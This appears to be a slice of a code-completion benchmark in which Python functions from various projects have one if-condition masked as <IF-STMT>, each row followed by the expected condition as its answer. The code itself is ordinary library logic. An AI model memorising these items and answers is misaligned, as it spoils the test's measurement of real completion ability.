3106,"def readVorbisComment(metadata, comment):<tab>metadata.producer = getValue(comment, ""vendor"")<tab>for item in comment.array(""metadata""):<tab><tab><IF-STMT><tab><tab><tab>key, value = item.value.split(""="", 1)<tab><tab><tab>key = key.upper()<tab><tab><tab>if key in VORBIS_KEY_TO_ATTR:<tab><tab><tab><tab>key = VORBIS_KEY_TO_ATTR[key]<tab><tab><tab><tab>setattr(metadata, key, value)<tab><tab><tab>elif value:<tab><tab><tab><tab>metadata.warning(""Skip Vorbis comment %s: %s"" % (key, value))","if ""="" in item . value :",157
3107,"def _read_readable(self, readable):<tab>blocksize = 8192<tab>if self.debuglevel > 0:<tab><tab>print(""sendIng a read()able"")<tab>encode = self._is_textIO(readable)<tab>if encode and self.debuglevel > 0:<tab><tab>print(""encoding file using iso-8859-1"")<tab>while True:<tab><tab>datablock = readable.read(blocksize)<tab><tab>if not datablock:<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>datablock = datablock.encode(""iso-8859-1"")<tab><tab>yield datablock",if encode :,139
3108,"def TryMerge(self, d):<tab>while 1:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 12:<tab><tab><tab>break<tab><tab>if tt == 18:<tab><tab><tab>self.set_value(d.getPrefixedString())<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>self.set_flags(d.get32())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 29 :,126
3109,"def needs_rebuild(self):<tab>for ratio in self.sprite.config[""ratios""]:<tab><tab>cocos2d_path = self.output_path(ratio)<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>data = plistlib.readPlist(cocos2d_path)<tab><tab><tab><tab>assert data[self.meta_key][""hash""] == self.sprite.hash<tab><tab><tab>except Exception:<tab><tab><tab><tab>continue<tab><tab>return True<tab>return False",if os . path . exists ( cocos2d_path ) :,125
3110,"def on_epoch_end(self, batch, logs=None):<tab># At the end of every epoch, remask the weights. This ensures that when<tab># the model is saved after completion, the weights represent mask*weights.<tab>weight_mask_ops = []<tab>for layer in self.prunable_layers:<tab><tab>if isinstance(layer, pruning_wrapper.PruneLowMagnitude):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>layer.pruning_obj.weight_mask_op()<tab><tab><tab>else:<tab><tab><tab><tab>weight_mask_ops.append(layer.pruning_obj.weight_mask_op())<tab>K.batch_get_value(weight_mask_ops)",if tf . executing_eagerly ( ) :,166
3111,"def buildQueryRE(queryText, caseSensitive, wholeWord):<tab>""returns a RegEx pattern for searching for the given queryText""<tab># word detection etc. cannot be done on an encoding-less string:<tab>assert type(queryText) == unicode<tab>pattern = re.escape(queryText)<tab>if wholeWord:<tab><tab>if re.search(""^\w"", queryText, re.UNICODE):<tab><tab><tab>pattern = ""\\b"" + pattern<tab><tab><IF-STMT><tab><tab><tab>pattern = pattern + ""\\b""<tab>flags = re.UNICODE<tab>if not (caseSensitive):<tab><tab>flags |= re.IGNORECASE<tab>return re.compile(pattern, flags)","if re . search ( ""\w$"" , queryText , re . UNICODE ) :",166
3112,"def is_valid_origin(origin):<tab>if not settings.SENTRY_ALLOW_ORIGIN:<tab><tab>return False<tab>if settings.SENTRY_ALLOW_ORIGIN == ""*"":<tab><tab>return True<tab>if not origin:<tab><tab>return False<tab>origin = origin.lower()<tab>for value in settings.SENTRY_ALLOW_ORIGIN:<tab><tab>if isinstance(value, string_types):<tab><tab><tab>if value.lower() == origin:<tab><tab><tab><tab>return True<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return True<tab>return False",if value . match ( origin ) :,137
3113,"def get_menu_title(self):<tab>handle = self.obj.get_handle()<tab>if handle:<tab><tab>who = get_participant_from_event(self.db, handle)<tab><tab>desc = self.obj.get_description()<tab><tab>event_name = self.obj.get_type()<tab><tab>if desc:<tab><tab><tab>event_name = ""%s - %s"" % (event_name, desc)<tab><tab><IF-STMT><tab><tab><tab>event_name = ""%s - %s"" % (event_name, who)<tab><tab>dialog_title = _(""Event: %s"") % event_name<tab>else:<tab><tab>dialog_title = _(""New Event"")<tab>return dialog_title",if who :,168
3114,def memory(self):<tab><IF-STMT><tab><tab>self.lazy_init_lock_.acquire()<tab><tab>try:<tab><tab><tab>if self.memory_ is None:<tab><tab><tab><tab>self.memory_ = SystemStat()<tab><tab>finally:<tab><tab><tab>self.lazy_init_lock_.release()<tab>return self.memory_,if self . memory_ is None :,85
3115,"def __str__(self):<tab>fmt = ""%#x"" if isinstance(self.target, six.integer_types) else ""%r""<tab>args = []<tab>for arg in self.args:<tab><tab>args.append(self._special_repr(arg))<tab>name = self.name or (fmt % self.target)<tab>arg_str = []<tab>for arg in args:<tab><tab><IF-STMT><tab><tab><tab>arg_str.append(hex(arg))<tab><tab>else:<tab><tab><tab>arg_str.append(str(arg))<tab>return ""%s(%s)"" % (name, "", "".join(arg_str))","if isinstance ( arg , six . integer_types ) and arg > 0x100 :",164
3116,"def change_password(username=""flexget"", password="""", session=None):<tab>check = zxcvbn.zxcvbn(password, user_inputs=[username])<tab>if check[""score""] < 3:<tab><tab>warning = check[""feedback""][""warning""]<tab><tab>suggestions = "" "".join(check[""feedback""][""suggestions""])<tab><tab>message = ""Password '{}' is not strong enough. "".format(password)<tab><tab>if warning:<tab><tab><tab>message += warning + "" ""<tab><tab><IF-STMT><tab><tab><tab>message += ""Suggestions: {}"".format(suggestions)<tab><tab>raise WeakPassword(message)<tab>user = get_user(username=username, session=session)<tab>user.password = str(generate_password_hash(password))<tab>session.commit()",if suggestions :,175
3117,"def _on_workflow_object_saved(sender, instance, created, *args, **kwargs):<tab>for instance_workflow in instance.river.all(instance.__class__):<tab><tab><IF-STMT><tab><tab><tab>instance_workflow.initialize_approvals()<tab><tab><tab>if not instance_workflow.get_state():<tab><tab><tab><tab>init_state = getattr(<tab><tab><tab><tab><tab>instance.__class__.river, instance_workflow.field_name<tab><tab><tab><tab>).initial_state<tab><tab><tab><tab>instance_workflow.set_state(init_state)<tab><tab><tab><tab>instance.save()",if created :,139
3118,"def recvmsg_into(self, buffers, *args):<tab>while True:<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab># The C code is sensitive about whether extra arguments are<tab><tab><tab><tab># passed or not.<tab><tab><tab><tab>return self._sock.recvmsg_into(buffers, *args)<tab><tab><tab>return self._sock.recvmsg_into(buffers)<tab><tab>except error as ex:<tab><tab><tab>if ex.args[0] != EWOULDBLOCK or self.timeout == 0.0:<tab><tab><tab><tab>raise<tab><tab>self._wait(self._read_event)",if args :,146
3119,def _generate_toc(line):<tab>while 1:<tab><tab><IF-STMT><tab><tab><tab>line = 5<tab><tab><tab>while 1:<tab><tab><tab><tab>if line:<tab><tab><tab><tab><tab>line = 6<tab><tab><tab><tab><tab>break<tab><tab><tab><tab>elif not line:<tab><tab><tab><tab><tab>line = 7<tab><tab><tab><tab><tab>break<tab><tab>elif not line:<tab><tab><tab>break<tab>return 1,"if line . startswith ( ""2"" ) :",103
3120,"def tearDown(self):<tab>for filename in os.listdir(from_here(""lib"")):<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>os.remove(from_here(""lib"", filename))<tab><tab><tab>except OSError:<tab><tab><tab><tab>pass  # File may no longer exist.",if filename not in self . files_to_keep :,80
3121,"def parse_literal_object(node):<tab>value = 0<tab>unit = get_default_weight_unit()<tab>for field in node.fields:<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>value = decimal.Decimal(field.value.value)<tab><tab><tab>except decimal.DecimalException:<tab><tab><tab><tab>raise GraphQLError(f""Unsupported value: {field.value.value}"")<tab><tab>if field.name.value == ""unit"":<tab><tab><tab>unit = field.value.value<tab>return Weight(**{unit: value})","if field . name . value == ""value"" :",134
3122,"def run(self):<tab>to_delete = set()<tab>for k, v in iteritems(self.objs):<tab><tab>if k.startswith(""_""):<tab><tab><tab>continue<tab><tab>if v[""_class""] == ""SubmissionFormatElement"":<tab><tab><tab>to_delete.add(k)<tab><tab><IF-STMT><tab><tab><tab>v[""submission_format""] = list(<tab><tab><tab><tab>self.objs[k][""filename""] for k in v.get(""submission_format"", list())<tab><tab><tab>)<tab>for k in to_delete:<tab><tab>del self.objs[k]<tab>return self.objs","if v [ ""_class"" ] == ""Task"" :",147
3123,"def _detect_too_many_digits(f):<tab>ret = []<tab>for node in f.nodes:<tab><tab># each node contains a list of IR instruction<tab><tab>for ir in node.irs:<tab><tab><tab># iterate over all the variables read by the IR<tab><tab><tab>for read in ir.read:<tab><tab><tab><tab># if the variable is a constant<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab># read.value can return an int or a str. Convert it to str<tab><tab><tab><tab><tab>value_as_str = read.original_value<tab><tab><tab><tab><tab>if ""00000"" in value_as_str:<tab><tab><tab><tab><tab><tab># Info to be printed<tab><tab><tab><tab><tab><tab>ret.append(node)<tab>return ret","if isinstance ( read , Constant ) :",183
3124,"def split_path_info(path):<tab># suitable for splitting an already-unquoted-already-decoded (unicode)<tab># path value<tab>path = path.strip(""/"")<tab>clean = []<tab>for segment in path.split(""/""):<tab><tab>if not segment or segment == ""."":<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>if clean:<tab><tab><tab><tab>del clean[-1]<tab><tab>else:<tab><tab><tab>clean.append(segment)<tab>return tuple(clean)","elif segment == "".."" :",115
3125,"def callback(f):<tab>unfinished_children.remove(f)<tab>if not unfinished_children:<tab><tab>try:<tab><tab><tab>result_list = [i.result() for i in children]<tab><tab>except Exception:<tab><tab><tab>future.set_exc_info(sys.exc_info())<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>future.set_result(dict(zip(keys, result_list)))<tab><tab><tab>else:<tab><tab><tab><tab>future.set_result(result_list)",if keys is not None :,128
3126,"def L_op(self, inputs, outputs, gout):<tab>(x,) = inputs<tab>(gz,) = gout<tab>if gz.type in complex_types:<tab><tab>raise NotImplementedError()<tab>if outputs[0].type in discrete_types:<tab><tab><IF-STMT><tab><tab><tab>return [x.zeros_like(dtype=theano.config.floatX)]<tab><tab>else:<tab><tab><tab>return [x.zeros_like()]<tab>return (gz * x * 2,)",if x . type in discrete_types :,117
3127,"def perform_page_up(self, event):<tab># if first line is visible then go there<tab># (by default it doesn't move then)<tab>try:<tab><tab>first_visible_idx = self.index(""@0,0"")<tab><tab>row, _ = map(int, first_visible_idx.split("".""))<tab><tab><IF-STMT><tab><tab><tab>self.mark_set(""insert"", ""1.0"")<tab>except Exception as e:<tab><tab>logger.exception(""Could not perform page up"", exc_info=e)",if row == 1 :,126
3128,"def __str__(self):<tab>s = """"<tab>for k, v in self._members.items():<tab><tab><IF-STMT><tab><tab><tab>s += k + "" : "" + "";"".join(getattr(self, item)) + ""\n""<tab><tab>elif isinstance(v.get(""type""), str):<tab><tab><tab>s += k + "" : "" + getattr(self, k) + ""\n""<tab>return s","if isinstance ( v . get ( ""type"" ) , list ) :",104
3129,"def _shared_pool(**opts):<tab>if ""host"" in opts:<tab><tab>key = ""%s:%s/%s"" % (<tab><tab><tab>opts[""host""],<tab><tab><tab>opts[""port""],<tab><tab><tab>opts[""db""],<tab><tab>)<tab>else:<tab><tab>key = ""%s/%s"" % (opts[""path""], opts[""db""])<tab>pool = _pool_cache.get(key)<tab><IF-STMT><tab><tab>return pool<tab>with _pool_lock:<tab><tab>pool = _pool_cache.get(key)<tab><tab>if pool is not None:<tab><tab><tab>return pool<tab><tab>pool = ConnectionPool(**opts)<tab><tab>_pool_cache[key] = pool<tab><tab>return pool",if pool is not None :,174
3130,"def _override_settings(self, overriden_settings: dict):<tab>for setting_name, setting_value in overriden_settings.items():<tab><tab>value = setting_value<tab><tab><IF-STMT><tab><tab><tab>value = getattr(self, setting_name, {})<tab><tab><tab>value.update(ObjDict(setting_value))<tab><tab>setattr(self, setting_name, value)","if isinstance ( setting_value , dict ) :",99
3131,"def match_tls_context(self, host: str, ir: ""IR""):<tab>for context in ir.get_tls_contexts():<tab><tab>hosts = context.get(""hosts"") or []<tab><tab>for context_host in hosts:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>ir.logger.debug(<tab><tab><tab><tab><tab>""Matched host {} with TLSContext {}"".format(<tab><tab><tab><tab><tab><tab>host, context.get(""name"")<tab><tab><tab><tab><tab>)<tab><tab><tab><tab>)<tab><tab><tab><tab>self.sni = True<tab><tab><tab><tab>return context<tab>return None",if context_host == host :,144
3132,"def get_form_datas(self):<tab># Prepare the dict of initial data from the request.<tab># We have to special-case M2Ms as a list of comma-separated PKs.<tab>if self.request_method == ""get"":<tab><tab>initial = dict(self.request.GET.items())<tab><tab>for k in initial:<tab><tab><tab>try:<tab><tab><tab><tab>f = self.opts.get_field(k)<tab><tab><tab>except models.FieldDoesNotExist:<tab><tab><tab><tab>continue<tab><tab><tab><IF-STMT><tab><tab><tab><tab>initial[k] = initial[k].split("","")<tab><tab>return {""initial"": initial}<tab>else:<tab><tab>return {""data"": self.request.POST, ""files"": self.request.FILES}","if isinstance ( f , models . ManyToManyField ) :",182
3133,"def run_until(loop, pred, timeout=30):<tab>deadline = time.time() + timeout<tab>while not pred():<tab><tab><IF-STMT><tab><tab><tab>timeout = deadline - time.time()<tab><tab><tab>if timeout <= 0:<tab><tab><tab><tab>raise futures.TimeoutError()<tab><tab>loop.run_until_complete(tasks.sleep(0.001, loop=loop))",if timeout is not None :,94
3134,"def update_translations():<tab>pot_path = os.path.join(root, ""messages.pot"")<tab>template = read_po(open(pot_path, ""rb""))<tab>for locale in get_locales():<tab><tab>po_path = os.path.join(root, locale, ""messages.po"")<tab><tab>mo_path = os.path.join(root, locale, ""messages.mo"")<tab><tab><IF-STMT><tab><tab><tab>catalog = read_po(open(po_path, ""rb""))<tab><tab><tab>catalog.update(template)<tab><tab><tab>f = open(po_path, ""wb"")<tab><tab><tab>write_po(f, catalog)<tab><tab><tab>f.close()<tab><tab><tab>print(""updated"", po_path)<tab>compile_translations()",if os . path . exists ( po_path ) :,191
3135,"def get_queryset_for_content_type(self, content_type_id):<tab>""""""Return the QuerySet from the QuerySetSequence for a ctype.""""""<tab>content_type = ContentType.objects.get_for_id(content_type_id)<tab>for queryset in self.queryset.get_querysets():<tab><tab><IF-STMT><tab><tab><tab># django-queryset-sequence 0.7 support dynamically created<tab><tab><tab># QuerySequenceModel which replaces the original model when it<tab><tab><tab># patches the queryset since 6394e19<tab><tab><tab>model = queryset.model.__bases__[0]<tab><tab>else:<tab><tab><tab>model = queryset.model<tab><tab>if model == content_type.model_class():<tab><tab><tab>return queryset","if queryset . model . __name__ == ""QuerySequenceModel"" :",177
3136,"def __bypass_wizard(self):<tab>bypass = False<tab>if self.device.remote_op.dir_exist(self.project_folder):<tab><tab>msg = ""A Tweak with the same PROJECT_NAME ({}) already exists. Do you want to delete it and start from scratch?"".format(<tab><tab><tab>self.options[""project_name""]<tab><tab>)<tab><tab>clean = choose_boolean(msg)<tab><tab><IF-STMT><tab><tab><tab>self.device.remote_op.dir_delete(self.project_folder)<tab><tab>else:<tab><tab><tab>bypass = True<tab>return bypass",if clean :,137
3137,"def wrapper(cached=True, reset=False):<tab>nonlocal cached_venv_dir<tab>if not cached or not cached_venv_dir or reset:<tab><tab>venv_dir = os.environ.get(""_VENV_DIR_"") or load_settings(lazy=True).get(<tab><tab><tab>""venv_dir""<tab><tab>)<tab><tab>if venv_dir:  # no cov<tab><tab><tab>if venv_dir == ""isolated"":<tab><tab><tab><tab>venv_dir = VENV_DIR_ISOLATED<tab><tab><tab><IF-STMT><tab><tab><tab><tab>venv_dir = VENV_DIR_SHARED<tab><tab>else:  # no cov<tab><tab><tab>venv_dir = VENV_DIR_SHARED<tab><tab>cached_venv_dir = venv_dir<tab>return cached_venv_dir","elif venv_dir == ""shared"" :",186
3138,"def run(self):<tab>while not self._stop:<tab><tab>for i in range(0, self._interval):<tab><tab><tab>time.sleep(1)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.__logger.debug(""%s - ping thread stopped"" % self.name)<tab><tab><tab><tab>return<tab><tab>ping = PingIqProtocolEntity()<tab><tab>self._layer.waitPong(ping.getId())<tab><tab>if not self._stop:<tab><tab><tab>self._layer.sendIq(ping)",if self . _stop :,126
3139,"def install(self, unicode=False, names=None):<tab>import __builtin__<tab>__builtin__.__dict__[""_""] = unicode and self.ugettext or self.gettext<tab>if hasattr(names, ""__contains__""):<tab><tab>if ""gettext"" in names:<tab><tab><tab>__builtin__.__dict__[""gettext""] = __builtin__.__dict__[""_""]<tab><tab><IF-STMT><tab><tab><tab>__builtin__.__dict__[""ngettext""] = (<tab><tab><tab><tab>unicode and self.ungettext or self.ngettext<tab><tab><tab>)<tab><tab>if ""lgettext"" in names:<tab><tab><tab>__builtin__.__dict__[""lgettext""] = self.lgettext<tab><tab>if ""lngettext"" in names:<tab><tab><tab>__builtin__.__dict__[""lngettext""] = self.lngettext","if ""ngettext"" in names :",181
3140,"def on_task_output(self, task, config):<tab>for entry in task.entries:<tab><tab>if ""torrent"" in entry:<tab><tab><tab><IF-STMT><tab><tab><tab><tab># re-write data into a file<tab><tab><tab><tab>log.debug(""Writing modified torrent file for %s"" % entry[""title""])<tab><tab><tab><tab>with open(entry[""file""], ""wb+"") as f:<tab><tab><tab><tab><tab>f.write(entry[""torrent""].encode())","if entry [ ""torrent"" ] . modified :",115
3141,"def batchSites(self, sites):<tab>i = 0<tab>res = list()<tab>siteList = list()<tab>for site in sites:<tab><tab><IF-STMT><tab><tab><tab>data = self.threadSites(siteList)<tab><tab><tab>if data is None:<tab><tab><tab><tab>return res<tab><tab><tab>for ret in list(data.keys()):<tab><tab><tab><tab>if data[ret]:<tab><tab><tab><tab><tab># bucket:filecount<tab><tab><tab><tab><tab>res.append(f""{ret}:{data[ret]}"")<tab><tab><tab>i = 0<tab><tab><tab>siteList = list()<tab><tab>siteList.append(site)<tab><tab>i += 1<tab>return res","if i >= self . opts [ ""_maxthreads"" ] :",168
3142,"def width_pixels(self):<tab>w = self.style_width<tab>if self._absolute_size and w == ""auto"":<tab><tab>w = self._absolute_size.width<tab>if type(w) is NumberUnit:<tab><tab>if self._relative_element == self:<tab><tab><tab>rew = self._parent_size.width if self._parent_size else 0<tab><tab>elif self._relative_element is None:<tab><tab><tab>rew = 0<tab><tab>else:<tab><tab><tab>rew = self._relative_element.width_pixels<tab><tab><IF-STMT><tab><tab><tab>rew = 0<tab><tab>w = w.val(base=rew)<tab>return w","if rew == ""auto"" :",160
3143,"def get_lang3(lang):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>ret_value = get(part1=lang).part3<tab><tab>elif len(lang) == 3:<tab><tab><tab>ret_value = lang<tab><tab>else:<tab><tab><tab>ret_value = """"<tab>except KeyError:<tab><tab>ret_value = lang<tab>return ret_value",if len ( lang ) == 2 :,94
3144,"def update_timer():<tab>global _timer<tab>if (time.time() - os.stat(config.TRAILS_FILE).st_mtime) >= config.UPDATE_PERIOD:<tab><tab>_ = None<tab><tab>while True:<tab><tab><tab>_ = load_trails(True)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>trails.clear()<tab><tab><tab><tab>trails.update(_)<tab><tab><tab><tab>break<tab><tab><tab>else:<tab><tab><tab><tab>time.sleep(LOAD_TRAILS_RETRY_SLEEP_TIME)<tab>_timer = threading.Timer(config.UPDATE_PERIOD, update_timer)<tab>_timer.start()",if _ :,149
3145,"def __call__(self, model):<tab>if hasattr(model, ""module""):<tab><tab>model = model.module<tab>conv1_lr_mult = self.paramwise_cfg.get(""conv1_lr_mult"", 1.0)<tab>params = []<tab>for name, param in model.named_parameters():<tab><tab>param_group = {""params"": [param]}<tab><tab><IF-STMT><tab><tab><tab>param_group[""lr""] = self.base_lr * conv1_lr_mult<tab><tab>params.append(param_group)<tab>optimizer_cfg[""params""] = params<tab>return build_from_cfg(optimizer_cfg, OPTIMIZERS)","if name . startswith ( ""conv1"" ) and param . requires_grad :",167
3146,"def _get_conf(self):<tab>conf = {}  # the configuration once all conf files are merged<tab>for path in map(Path, self.template_paths):<tab><tab>conf_path = path / ""conf.json""<tab><tab><IF-STMT><tab><tab><tab>with conf_path.open() as f:<tab><tab><tab><tab>conf = recursive_update(conf, json.load(f))<tab>return conf",if conf_path . exists ( ) :,100
3147,"def _base_keywords(self, fw_version=False, image=False):<tab>keywords = dict()<tab>if image:<tab><tab>keywords[""image_uri""] = ""'my:image'""<tab>if fw_version:<tab><tab>keywords[""framework_version""] = (<tab><tab><tab>""fw_version""<tab><tab><tab><IF-STMT><tab><tab><tab>else ""'{}'"".format(self.framework_version)<tab><tab>)<tab>return keywords","if fw_version == ""named""",110
3148,"def check_grads(grads_and_vars):<tab>has_nan_ops = []<tab>amax_ops = []<tab>for grad, _ in grads_and_vars:<tab><tab>if grad is not None:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>x = grad.values<tab><tab><tab>else:<tab><tab><tab><tab>x = grad<tab><tab><tab>has_nan_ops.append(tf.reduce_any(tf.is_nan(x)))<tab><tab><tab>amax_ops.append(tf.reduce_max(tf.abs(x)))<tab>has_nan = tf.reduce_any(has_nan_ops)<tab>amax = tf.reduce_max(amax_ops)<tab>return has_nan, amax","if isinstance ( grad , tf . IndexedSlices ) :",179
3149,"def new_org(type=ORG_DEFAULT, block=True, **kwargs):<tab>if type == ORG_DEFAULT:<tab><tab>org = reserve_pooled(type=type, **kwargs)<tab><tab>if not org:<tab><tab><tab>org = queue.reserve(""queued_org"", block=block, type=type, **kwargs)<tab><tab><IF-STMT><tab><tab><tab>new_pooled()<tab><tab><tab>return org<tab><tab>org = Organization(type=type, **kwargs)<tab><tab>org.initialize()<tab><tab>org.commit()<tab><tab>return org<tab>else:<tab><tab>org = Organization(type=type, **kwargs)<tab><tab>org.queue_initialize(block=block)<tab><tab>return org",if org :,171
3150,"def _consumer_healthy(self):<tab>abnormal_num = 0<tab>for w in self._consumers:<tab><tab><IF-STMT><tab><tab><tab>abnormal_num += 1<tab><tab><tab>if self._use_process:<tab><tab><tab><tab>errmsg = ""consumer[{}] exit abnormally with exitcode[{}]"".format(<tab><tab><tab><tab><tab>w.pid, w.exitcode<tab><tab><tab><tab>)<tab><tab><tab>else:<tab><tab><tab><tab>errmsg = ""consumer[{}] exit abnormally"".format(w.ident)<tab><tab><tab>logger.warn(errmsg)<tab>if abnormal_num > 0:<tab><tab>logger.warn(""{} consumers have exited abnormally!!!"".format(abnormal_num))<tab>return abnormal_num == 0",if not w . is_alive ( ) and w . id not in self . _consumer_endsig :,186
3151,"def add_data_source(self, f=None, s_name=None, source=None, module=None, section=None):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>module = self.name<tab><tab>if section is None:<tab><tab><tab>section = ""all_sections""<tab><tab>if s_name is None:<tab><tab><tab>s_name = f[""s_name""]<tab><tab>if source is None:<tab><tab><tab>source = os.path.abspath(os.path.join(f[""root""], f[""fn""]))<tab><tab>report.data_sources[module][section][s_name] = source<tab>except AttributeError:<tab><tab>logger.warning(<tab><tab><tab>""Tried to add data source for {}, but was missing fields data"".format(<tab><tab><tab><tab>self.name<tab><tab><tab>)<tab><tab>)",if module is None :,198
3152,"def startTest(self, test):<tab>unittest.TestResult.startTest(self, test)<tab>current_case = test.test.__class__.__name__<tab>if self.showAll:<tab><tab><IF-STMT><tab><tab><tab>self.stream.writeln(current_case)<tab><tab><tab>self._last_case = current_case<tab><tab>self.stream.write(""<tab>%s"" % str(test.test._testMethodName).ljust(60))<tab><tab>self.stream.flush()",if current_case != self . _last_case :,123
3153,"def _calc_freq(item):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>ao = sum([int(x) for x in item.split("":"")[ao_index].split("","")])<tab><tab><tab>ro = int(item.split("":"")[ro_index])<tab><tab><tab>freq = ao / float(ao + ro)<tab><tab>elif af_index is not None:<tab><tab><tab>freq = float(item.split("":"")[af_index])<tab><tab>else:<tab><tab><tab>freq = 0.0<tab>except (IndexError, ValueError, ZeroDivisionError):<tab><tab>freq = 0.0<tab>return freq",if ao_index is not None and ro_index is not None :,151
3154,"def contains_version(self, version):<tab>""""""Returns True if version is contained in this range.""""""<tab>if len(self.bounds) < 5:<tab><tab># not worth overhead of binary search<tab><tab>for bound in self.bounds:<tab><tab><tab>i = bound.version_containment(version)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return True<tab><tab><tab>if i == -1:<tab><tab><tab><tab>return False<tab>else:<tab><tab>_, contains = self._contains_version(version)<tab><tab>return contains<tab>return False",if i == 0 :,130
3155,"def _codegen_impl(self, state: CodegenState, default_semicolon: bool = False) -> None:<tab>with state.record_syntactic_position(self):<tab><tab>state.add_token(""global"")<tab><tab>self.whitespace_after_global._codegen(state)<tab><tab>last_name = len(self.names) - 1<tab><tab>for i, name in enumerate(self.names):<tab><tab><tab>name._codegen(state, default_comma=(i != last_name))<tab>semicolon = self.semicolon<tab>if isinstance(semicolon, MaybeSentinel):<tab><tab><IF-STMT><tab><tab><tab>state.add_token(""; "")<tab>elif isinstance(semicolon, Semicolon):<tab><tab>semicolon._codegen(state)",if default_semicolon :,184
3156,"def getLatestXci(self, version=None):<tab>highest = None<tab>for nsp in self.getFiles():<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if version is not None and nsp.version == version:<tab><tab><tab><tab><tab>return nsp<tab><tab><tab><tab>if not highest or int(nsp.version) > int(highest.version):<tab><tab><tab><tab><tab>highest = nsp<tab><tab>except BaseException:<tab><tab><tab>pass<tab>return highest","if nsp . path . endswith ( "".xci"" ) :",118
3157,"def _process_iter(self, line_iter):<tab>samples = []<tab>buf = []<tab>for line in line_iter:<tab><tab>if not buf and line.startswith(""#"") and self._has_comment:<tab><tab><tab>continue<tab><tab>line = line.split()<tab><tab>if line:<tab><tab><tab>buf.append(line)<tab><tab><IF-STMT><tab><tab><tab>samples.append(tuple(map(list, zip(*buf))))<tab><tab><tab>buf = []<tab>if buf:<tab><tab>samples.append(tuple(map(list, zip(*buf))))<tab>return samples",elif buf :,137
3158,def examine_tree(tree):<tab>for node in tree.post_order():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>print(repr(str(node)))<tab><tab>verdict = raw_input()<tab><tab>if verdict.strip():<tab><tab><tab>print(find_pattern(node))<tab><tab><tab>return,"if isinstance ( node , pytree . Leaf ) :",84
3159,"def foundNestedPseudoClass(self):<tab>i = self.pos + 1<tab>openParen = 0<tab>while i < len(self.source_text):<tab><tab>ch = self.source_text[i]<tab><tab>if ch == ""{"":<tab><tab><tab>return True<tab><tab>elif ch == ""("":<tab><tab><tab># pseudoclasses can contain ()<tab><tab><tab>openParen += 1<tab><tab>elif ch == "")"":<tab><tab><tab>if openParen == 0:<tab><tab><tab><tab>return False<tab><tab><tab>openParen -= 1<tab><tab><IF-STMT><tab><tab><tab>return False<tab><tab>i += 1<tab>return False","elif ch == "";"" or ch == ""}"" :",155
3160,"def scan_resource_conf(self, conf):<tab>self.evaluated_keys = ""user_data""<tab>if ""user_data"" in conf.keys():<tab><tab>user_data = conf[""user_data""][0]<tab><tab><IF-STMT><tab><tab><tab>if string_has_secrets(user_data):<tab><tab><tab><tab>return CheckResult.FAILED<tab>return CheckResult.PASSED","if isinstance ( user_data , str ) :",99
3161,"def strip_suffixes(path: str) -> str:<tab>t = path<tab>while True:<tab><tab>if t.endswith("".xz""):<tab><tab><tab>t = t[:-3]<tab><tab>elif t.endswith("".raw""):<tab><tab><tab>t = t[:-4]<tab><tab>elif t.endswith("".tar""):<tab><tab><tab>t = t[:-4]<tab><tab><IF-STMT><tab><tab><tab>t = t[:-6]<tab><tab>else:<tab><tab><tab>break<tab>return t","elif t . endswith ( "".qcow2"" ) :",119
3162,"def classify(self, url, text):<tab>for match in self.rules.match(data=text):<tab><tab>if (url, match) in self.matches:<tab><tab><tab>continue<tab><tab>self.matches.append((url, match))<tab><tab><IF-STMT>  # pragma: no cover<tab><tab><tab>continue<tab><tab>self.handle_match_etags(match)<tab><tab>rule = match.rule<tab><tab>meta = match.meta<tab><tab>tags = "","".join(["" "".join(t.split(""_"")) for t in match.tags])<tab><tab>log.ThugLogging.log_classifier(""text"", url, rule, tags, meta)<tab>for c in self.custom_classifiers:<tab><tab>self.custom_classifiers[c](url, text)","if self . discard_url_match ( url , match ) :",186
3163,"def is_symmetric_iterative(root):<tab>if root is None:<tab><tab>return True<tab>stack = [[root.left, root.right]]<tab>while stack:<tab><tab>left, right = stack.pop()  # popleft<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if left is None or right is None:<tab><tab><tab>return False<tab><tab>if left.val == right.val:<tab><tab><tab>stack.append([left.left, right.right])<tab><tab><tab>stack.append([left.right, right.left])<tab><tab>else:<tab><tab><tab>return False<tab>return True",if left is None and right is None :,149
3164,"def __str__(self):<tab>if self.looptype.is_pretest:<tab><tab><IF-STMT><tab><tab><tab>return ""%d-While(!%s)[%s]"" % (self.num, self.name, self.cond)<tab><tab>return ""%d-While(%s)[%s]"" % (self.num, self.name, self.cond)<tab>elif self.looptype.is_posttest:<tab><tab>return ""%d-DoWhile(%s)[%s]"" % (self.num, self.name, self.cond)<tab>elif self.looptype.is_endless:<tab><tab>return ""%d-WhileTrue(%s)[%s]"" % (self.num, self.name, self.cond)<tab>return ""%d-WhileNoType(%s)"" % (self.num, self.name)",if self . false in self . loop_nodes :,198
